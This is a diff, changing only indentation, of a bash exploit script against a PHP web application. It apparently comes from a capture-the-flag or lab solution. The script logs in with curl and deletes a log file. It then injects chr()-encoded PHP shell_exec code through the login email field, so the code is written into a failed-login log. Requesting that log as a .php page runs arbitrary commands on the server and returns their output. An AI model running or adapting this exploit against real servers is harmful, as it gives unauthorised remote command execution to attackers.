@@ -399,42 +399,42 @@ COMD=$3
 
 # authenticate
 function authenticate() {
-  curl \
-    -s \
-    -c cookie \
-    -d "email=$EMAIL&pass=$PASS&submit=submit" \
-    http://$HOST/$BASE/login.php &>/dev/null
+    curl \
+        -s \
+        -c cookie \
+        -d "email=$EMAIL&pass=$PASS&submit=submit" \
+        http://$HOST/$BASE/login.php &>/dev/null
 }
 
 # encode
 function encode() {
-  for b in $(echo -n "$1" | xxd -p | sed -r 's/(..)/\1 /g'); do
-    printf "chr(%d)\n" "0x$b"
-  done | tr '\n' '.' | sed 's/.$//g'
-  echo
+    for b in $(echo -n "$1" | xxd -p | sed -r 's/(..)/\1 /g'); do
+        printf "chr(%d)\n" "0x$b"
+    done | tr '\n' '.' | sed 's/.$//g'
+    echo
 }
 
 # exploit
 function exploit() {
-  PAYLOAD=$(encode "$COMD")
-  DATE=$(date "+%Y-%m-%d")
-  curl \
-    -s \
-    -b cookie \
-    http://$HOST/$BASE/deletesecretlogfile.php?file=$DATE.php &>/dev/null
-  curl \
-    -s \
-    --data "email=<?php echo shell_exec($PAYLOAD);?>&pass=&submit=submit" \
-    http://$HOST/$BASE/login.php &>/dev/null
-  curl \
-    -s \
-    -b cookie \
-    http://$HOST/$BASE/$SECRET/$DATE.php | \
-    sed -e 's/Failed login attempt detected with email: //' -e 's/<br>//g' | \
-    sed '1d' | sed '$d'
+    PAYLOAD=$(encode "$COMD")
+    DATE=$(date "+%Y-%m-%d")
+    curl \
+        -s \
+        -b cookie \
+        http://$HOST/$BASE/deletesecretlogfile.php?file=$DATE.php &>/dev/null
+    curl \
+        -s \
+        --data "email=<?php echo shell_exec($PAYLOAD);?>&pass=&submit=submit" \
+        http://$HOST/$BASE/login.php &>/dev/null
+    curl \
+        -s \
+        -b cookie \
+        http://$HOST/$BASE/$SECRET/$DATE.php | \
+        sed -e 's/Failed login attempt detected with email: //' -e 's/<br>//g' | \
+        sed '1d' | sed '$d'
 }
 
-# main()
+# main
 authenticate
 exploit
 
